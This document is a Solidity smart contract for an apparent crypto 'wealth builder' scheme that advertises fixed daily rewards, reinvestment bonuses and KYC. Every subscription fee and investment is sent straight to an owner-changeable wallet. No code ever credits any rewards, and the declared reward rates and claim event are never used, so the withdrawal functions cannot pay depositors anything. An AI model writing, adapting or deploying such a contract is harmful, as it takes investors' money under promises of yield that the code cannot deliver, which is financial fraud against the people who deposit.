// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract MARANATHA_WEALTH_BUILDER {
    address public owner;
    address public depositWallet = 0xbE04Ad8E9F649cefBd2acFf5898C24360AF26998;
    address public gasFeeWallet = 0xe4939763Ef4280aeCe37839A4893b4d8125a4ee8;
    uint256 public constant INITIAL_SUBSCRIPTION_FEE = 5 ether;
    uint256 public constant POST_30K_SUBSCRIPTION_FEE = 8 ether;
    uint256 public constant RENEWAL_FEE = 10 ether;
    uint256 public constant DAILY_REWARD_FIRST_30K = 3;
    uint256 public constant DAILY_REWARD_POST_30K = 15;
    uint256 public constant REINVEST_BONUS_FIRST_30K = 5;
    uint256 public constant REINVEST_BONUS_POST_30K = 35;
    uint256 public constant WITHDRAWAL_FEE_PERCENT = 2;
    uint256 public constant GRACECOIN_WITHDRAWAL_PERCENT = 25;
    uint256 public constant MIN_INVESTMENT = 1 ether;
    uint256 public constant MAX_INVESTMENT = 100000 ether;
    uint256 public constant MIN_WITHDRAWAL = 1 ether;
    uint256 public constant MAX_WITHDRAWAL = 300 ether;

    uint256 public userCount;
    uint256 public constant MAX_FIRST_30K_USERS = 30000;

    enum DocumentType { None, NationalID, Passport, DriversLicense }

    struct User {
        bool isSubscribed;
        uint256 subscriptionTime;
        uint256 stakedAmount;
        uint256 lastClaimTime;
        uint256 totalRewards;
        uint256 graceCoinRewards;
        bool hasReinvested;
        uint256 adRewards;
        uint256 videoRewards;
        uint256 socialMediaRewards;
        uint256 referralRewards;
        uint256 educationRewards;
        uint256 totalInvestment;
    }

    mapping(address => User) public users;
    mapping(address => bool) public kycVerified;
    mapping(address => DocumentType) public kycDocuments;

    event Subscribed(address indexed user, uint256 amount);
    event Invested(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 reward);
    event Withdrawn(address indexed user, uint256 amount);
    event GraceCoinWithdrawn(address indexed user, uint256 amount);
    event KYCCompleted(address indexed user, DocumentType docType);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function setDepositWallet(address _wallet) external onlyOwner {
        depositWallet = _wallet;
    }

    function setGasFeeWallet(address _wallet) external onlyOwner {
        gasFeeWallet = _wallet;
    }

    function subscribe() external payable {
        require(!users[msg.sender].isSubscribed, "Already subscribed");
        uint256 fee = calculateSubscriptionFee();
        require(msg.value >= fee, "Insufficient subscription fee");

        users[msg.sender] = User({
            isSubscribed: true,
            subscriptionTime: block.timestamp,
            stakedAmount: 0,
            lastClaimTime: 0,
            totalRewards: 0,
            graceCoinRewards: 0,
            hasReinvested: false,
            adRewards: 0,
            videoRewards: 0,
            socialMediaRewards: 0,
            referralRewards: 0,
            educationRewards: 0,
            totalInvestment: 0
        });
        userCount++;
        payable(depositWallet).transfer(msg.value);
        emit Subscribed(msg.sender, msg.value);
    }

    function calculateSubscriptionFee() public view returns (uint256) {
        return userCount < MAX_FIRST_30K_USERS ? INITIAL_SUBSCRIPTION_FEE : POST_30K_SUBSCRIPTION_FEE;
    }

    function invest() external payable {
        require(users[msg.sender].isSubscribed, "Not subscribed");
        require(msg.value >= MIN_INVESTMENT && msg.value <= MAX_INVESTMENT, "Investment out of bounds");

        User storage user = users[msg.sender];
        user.totalInvestment += msg.value;
        user.stakedAmount += msg.value;

        payable(depositWallet).transfer(msg.value);
        emit Invested(msg.sender, msg.value);
    }

    function setKYC(address user, bool status, DocumentType docType) external onlyOwner {
        require(docType != DocumentType.None, "Invalid document type");
        kycVerified[user] = status;
        kycDocuments[user] = docType;
        emit KYCCompleted(user, docType);
    }

    function withdrawGraceCoin(uint256 amount) external {
        User storage user = users[msg.sender];
        require(user.totalInvestment >= 2000 ether, "$2000+ investment required");
        uint256 maxWithdrawable = (user.graceCoinRewards * GRACECOIN_WITHDRAWAL_PERCENT) / 100;
        require(amount <= maxWithdrawable, "Exceeds GraceCoin withdrawal limit");

        user.graceCoinRewards -= amount;
        payable(msg.sender).transfer(amount);
        emit GraceCoinWithdrawn(msg.sender, amount);
    }

    function withdraw(uint256 amount) external {
        User storage user = users[msg.sender];
        require(amount >= MIN_WITHDRAWAL && amount <= MAX_WITHDRAWAL, "Amount out of bounds");
        require(amount <= user.totalRewards, "Insufficient rewards");

        uint256 fee = (amount * WITHDRAWAL_FEE_PERCENT) / 100;
        uint256 netAmount = amount - fee;

        user.totalRewards -= amount;
        payable(gasFeeWallet).transfer(fee);
        payable(msg.sender).transfer(netAmount);

        emit Withdrawn(msg.sender, netAmount);
    }

    receive() external payable {}
}